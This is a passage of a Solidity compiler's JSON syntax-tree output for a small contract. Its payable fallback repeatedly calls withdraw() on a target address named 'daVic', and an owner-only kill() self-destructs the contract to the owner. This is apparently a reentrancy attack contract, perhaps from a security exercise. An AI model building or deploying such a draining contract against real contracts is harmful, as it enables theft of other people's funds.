																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 11,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "221:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "213:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 13,
												"nodeType": "ExpressionStatement",
												"src": "213:18:0"
											}
										]
									},
									"id": 15,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "198:2:0"
									},
									"returnParameters": {
										"id": 8,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "202:0:0"
									},
									"scope": 62,
									"src": "187:52:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 25,
										"nodeType": "Block",
										"src": "265:57:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 21,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"expression": {
																	"id": 18,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "284:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 19,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"src": "284:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"id": 20,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 3,
																"src": "296:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "284:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 17,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "276:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 22,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "276:26:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 23,
												"nodeType": "ExpressionStatement",
												"src": "276:26:0"
											},
											{
												"id": 24,
												"nodeType": "PlaceholderStatement",
												"src": "313:1:0"
											}
										]
									},
									"id": 26,
									"name": "isOwner",
									"nameLocation": "256:7:0",
									"nodeType": "ModifierDefinition",
									"parameters": {
										"id": 16,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "263:2:0"
									},
									"src": "247:75:0",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 38,
										"nodeType": "Block",
										"src": "361:48:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"arguments": [
																{
																	"id": 34,
																	"name": "owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "394:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 33,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "385:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 32,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "385:9:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {}
																}
															},
															"id": 35,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "385:15:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 31,
														"name": "selfdestruct",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4294967275,
														"src": "372:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
															"typeString": "function (address payable)"
														}
													},
													"id": 36,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "372:29:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 37,
												"nodeType": "ExpressionStatement",
												"src": "372:29:0"
											}
										]
									},
									"functionSelector": "41c0e1b5",
									"id": 39,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": [],
											"id": 29,
											"modifierName": {
												"id": 28,
												"name": "isOwner",
												"nodeType": "IdentifierPath",
												"referencedDeclaration": 26,
												"src": "344:7:0"
											},
											"nodeType": "ModifierInvocation",
											"src": "344:9:0"
										}
									],
									"name": "kill",
									"nameLocation": "337:4:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 27,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "341:2:0"
									},
									"returnParameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "361:0:0"
									},
									"scope": 62,
									"src": "328:81:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 53,
										"nodeType": "Block",
										"src": "440:81:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"arguments": [
																{
																	"hexValue": "77697468647261772829",
																	"id": 49,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "499:12:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_3ccfd60b2e3ddce51ab210bfb9db13577f03a21684fa35e4bcd739dd5a30bda2",
																		"typeString": "literal_string \"withdraw()\""
																	},
																	"value": "withdraw()"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_3ccfd60b2e3ddce51ab210bfb9db13577f03a21684fa35e4bcd739dd5a30bda2",
																		"typeString": "literal_string \"withdraw()\""
																	}
																],
																"expression": {
																	"id": 47,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967295,
																	"src": "475:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 48,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSignature",
																"nodeType": "MemberAccess",
																"src": "475:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (string memory) pure returns (bytes memory)"
																}
															},
															"id": 50,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "475:37:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															],
															"expression": {
																"id": 42,
																"name": "daVic",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 6,
																"src": "451:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 44,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"src": "451:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 46,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"gas"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"hexValue": "37393030303030",
																"id": 45,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "466:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_7900000_by_1",
																	"typeString": "int_const 7900000"
																},
																"value": "7900000"
															}
														],
														"src": "451:23:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$gas",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 51,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "451:62:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 52,
												"nodeType": "ExpressionStatement",
												"src": "451:62:0"
											}
										]
									},
									"functionSelector": "a3fdfee3",
									"id": 54,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "deny",
									"nameLocation": "426:4:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 40,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "430:2:0"
									},
									"returnParameters": {
										"id": 41,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "440:0:0"
									},
									"scope": 62,
									"src": "417:104:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 60,
										"nodeType": "Block",
										"src": "554:25:0",
										"statements": [
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 57,
														"name": "deny",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 54,
														"src": "565:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$__$returns$__$",
															"typeString": "function ()"
														}
													},
													"id": 58,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "565:6:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 59,
												"nodeType": "ExpressionStatement",
												"src": "565:6:0"
											}
										]
									},
									"id": 61,
									"implemented": true,
									"kind": "fallback",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 55,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "535:2:0"
									},
									"returnParameters": {
										"id": 56,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "554:0:0"
									},
									"scope": 62,
									"src": "527:52:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 63,
							"src": "57:527:0"
						}
					],
					"src": "31:553:0"
				},
				"id": 0
			}
		}
	}
}